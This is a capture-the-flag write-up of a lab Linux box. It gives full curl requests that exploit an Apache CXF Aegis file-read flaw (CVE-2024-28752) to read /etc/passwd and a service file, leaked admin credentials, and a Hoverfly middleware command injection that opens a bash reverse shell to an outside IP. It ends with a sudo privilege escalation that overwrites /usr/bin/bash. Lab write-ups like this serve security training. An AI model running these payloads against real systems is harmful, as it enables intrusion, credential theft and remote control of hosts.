## Review

A medium Linux box that chains a bunch of service misconfigurations. The foothold is the fun part: anonymous FTP hands you a Java SOAP application built on Apache CXF with the Aegis databinding module, which is vulnerable to an SSRF/local file read (CVE-2024-28752) through XOP inclusion. From there you read a running process' command line to recover Hoverfly admin credentials, then abuse a Hoverfly middleware RCE for the foothold. Root is a sudo-allowed monitoring script combined with a world-writable bash binary.
The user flag takes some patience with the SOAP/MTOM request crafting, while root is a classic "what can I actually do with these sudo rights" puzzle.

**Personal Rating:** ⭐⭐⭐⭐ (4/5)

**Recommended for:** Anyone wanting to practice SSRF to local file read, decompiling and source-reviewing a JAR, and thinking through sudo/binary permission privesc.

The FTP allows anonymous login, so I started there.

```bash

#user: anonymous

```

Looks like a Java servlet. Since port 8080 is a Jetty instance, this JAR is very likely what runs behind it, so it's worth decompiling to understand what the service does and how to reach it.

```bash
#Decompiling the file with jadx
jadx -d decompiled/ employee-service.jar
```

Browsing the decompiled sources I found an `htb/devarea` folder with these files:

```bash
ls
EmployeeServiceImpl.java  EmployeeService.java  Report.java  ServerStarter.java
```

The application is a small Java SOAP web service built with Apache CXF and JAX-WS. It exposes a single operation, `submitReport(Report report)`, which accepts a `Report` object with `employeeName`, `department`, `content`, and a `confidential` flag. The `ServerStarter` class tells us the important part: where the service lives.

```java
//ServerStarter.java (relevant part)
factory.setAddress("http://0.0.0.0:8080/employeeservice");
//WSDL available at http://localhost:8080/employeeservice?wsdl
```

So the SOAP endpoint is at `/employeeservice`, with its WSDL at `/employeeservice?wsdl`.

I also found the project's `pom.xml`, which is where the technologies (and versions) are declared. Version numbers are exactly what I need to look for known CVEs.

```bash
cat decompiled/resources/META-INF/maven/com.environment/employee-service/pom.xml
```

From the pom.xml, the technologies in use are:

- **Apache CXF 3.2.14** — framework for the SOAP web service (JAX-WS frontend, SOAP binding, HTTP/Jetty transport, Aegis databinding)
- **Jetty** — embedded HTTP server (via `cxf-rt-transports-http-jetty`)
- **Java 8** — compiler version
- **SLF4J 1.7.26** — logging
- **Maven** with Shade Plugin 3.6.0 — build tool, produces an executable fat JAR

The line that caught my eye is `cxf-rt-databinding-aegis`. Looking up Apache CXF 3.2.14 with the Aegis databinding, I found CVE-2024-28752: a Server-Side Request Forgery in Aegis that can be pushed into local file read via an XOP Include element pointing at a `file://` URI. That's exactly the primitive to start probing the box internally.

### Foothold - CVE-2024-28752 (SSRF to local file read)

The Aegis vulnerability lets us smuggle an XOP (XML-binary Optimized Packaging) Include element into the SOAP body. When CXF processes the `href` of that element it dereferences the URI and accepts the `file://` scheme, returning the file contents Base64-encoded inside the SOAP response.

It took a fair amount of trial and error to get the multipart/MTOM request formatted correctly. To confirm the primitive I read `/etc/passwd`.

```bash
#Reading /etc/passwd via XOP Include (SOAP/MTOM), output is base64 so we decode it
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H "Content-Type: multipart/related; type=\"application/xop+xml\"; start=\"<rootpart@example.com>\"; start-info=\"text/xml\"; boundary=\"MIMEBoundary\"" \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@example.com>\r\n\r\n<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/"><soapenv:Body><tns:submitReport><arg0><confidential>false</confidential><content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></content><department>IT</department><employeeName>test</employeeName></arg0></tns:submitReport></soapenv:Body></soapenv:Envelope>\r\n--MIMEBoundary--' | grep -oP '(?<=Content: )[^<]+' | base64 -d

#Result (trimmed)
root:x:0:0:root:/root:/bin/bash  
...  
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash  
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin  
...
```

Arbitrary local file read confirmed, and I can already see two interesting accounts: `dev_ryan` (a real login shell) and `syswatch` (a service account).

File read alone is good, but the real value is the Linux `/proc` filesystem. Each process exposes `/proc/<PID>/cmdline` with the exact command line it was launched with, and services are often started with credentials passed directly as arguments. I remembered from the nmap scan that Hoverfly is running (ports 8500/8888), and the Hoverfly dashboard on 8888 needs a login I don't have, so reading process command lines is a good way to try and recover those credentials.

Reading through the `hoverfly.service` unit file is the cleanest way to get its start command, since systemd services store it there.

```bash
#Reading the Hoverfly service unit file
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H "Content-Type: multipart/related; type=\"application/xop+xml\"; start=\"<rootpart@example.com>\"; start-info=\"text/xml\"; boundary=\"MIMEBoundary\"" \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@example.com>\r\n\r\n<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/"><soapenv:Body><tns:submitReport><arg0><confidential>false</confidential><content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></content><department>IT</department><employeeName>test</employeeName></arg0></tns:submitReport></soapenv:Body></soapenv:Envelope>\r\n--MIMEBoundary--' | grep -oP '(?<=Content: )[^<]+' | base64 -d
```

There it is: the Hoverfly admin credentials `admin:O7IJ27MyyXiU`, passed in plaintext on the command line, and the service runs as `dev_ryan`.

First thing I tried was reusing the password for SSH, since credential reuse is always worth a shot.

```bash

#Result
```

No luck. So the credentials are only good for Hoverfly itself. Logging into the Hoverfly Admin UI on port 8888 works, and the dashboard reports version v1.11.3.

Hoverfly 1.11.3 and earlier are affected by CVE-2025-54123, a command injection in the middleware management endpoint `/api/v2/hoverfly/middleware`. The endpoint doesn't validate the supplied binary and script, so it will execute an arbitrary script on the host as the Hoverfly process user. That gives RCE as `dev_ryan`.

```bash
#Set up the listener first
nc -lvnp 4444

#Authenticate to get a Bearer token
curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'

#Use the token to register a middleware whose script is a reverse shell
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.237/4444 0>&1"}'

#Result on the listener
dev_ryan@devarea:/opt/HoverFly$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

### Privilege Escalation - sudo syswatch.sh + world-writable bash

Alongside the user flag there is a `syswatch-v1.zip` in the home directory containing the full source of an internal monitoring app. Reviewing an app's own source is usually the fastest way to understand it, so I extracted it.

```bash
dev_ryan@devarea:~$ unzip -l syswatch-v1.zip
#Archive contains: app.py, syswatch.sh, monitor.sh, setup.sh, plugins/, config/, a syswatch.db, and the web GUI
```

Checking sudo rights for `dev_ryan` shows the interesting bit:

```bash
sudo -l

#Result
User dev_ryan may run the following commands on devarea:  
   (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

So I can run `/opt/syswatch/syswatch.sh` as root with any argument except `web-stop` and `web-restart`. Reading the script, the log-viewer path has symlink protections and the plugin runner drops to the `syswatch` user via `runuser`, so neither offered me an obvious way to escalate. I spent a while here and couldn't figure out how to turn these sudo rights directly into root.

While looking for alternative ways to grab the flag, I went back to basics and enumerated writable files across the system, which is where another path showed up.

```bash
#Hunting for writable binaries/files
find / -writable -type f 2>/dev/null | grep -v -E '/proc|/sys'

#Result (the important hit)
/usr/bin/bash
```

`/usr/bin/bash` is world-writable. Since `syswatch.sh` starts with `#!/bin/bash` and I can run it as root via sudo. If I overwrite the bash binary with my own script, then when root runs `syswatch.sh` the interpreter that executes it is my payload, running as root. Any allowed subcommand works as the trigger, `--version` is fine since it isn't on the deny list.

```bash
#Overwrite bash with a payload that dumps the root flag, then trigger it via the sudo-allowed script
printf '#!/bin/sh\ncat /root/root.txt > /tmp/flag.txt\n' > /tmp/evil.sh && dd if=/tmp/evil.sh of=/usr/bin/bash && sudo /opt/syswatch/syswatch.sh --version; cat /tmp/flag.txt

#Result
0+1 records in  
0+1 records out  
45 bytes copied, 0.000179156 s, 251 kB/s  
<FLAG>
```

Root flag captured.

> **Note (added after the fact):** I only grabbed the flag here. Reading the official writeup afterwards, the intended privesc doesn't touch the bash binary at all: it abuses a symlink-chain flaw in `syswatch.sh`'s `view_logs()` function. That function only inspects the *immediate* target of a symlink, so a chain (a benign-looking log name pointing to a second link that points at a sensitive file) passes validation, and the root-run CLI follows it and `cat`s the target. The official path points the final link at `/root/.ssh/id_ed25519`, leaks the root SSH private key, and logs in over SSH for a full interactive root shell. I wasn't able to find that on my own, my world-writable bash route got the flag but not a clean root shell.

With the flag read, the box is done.
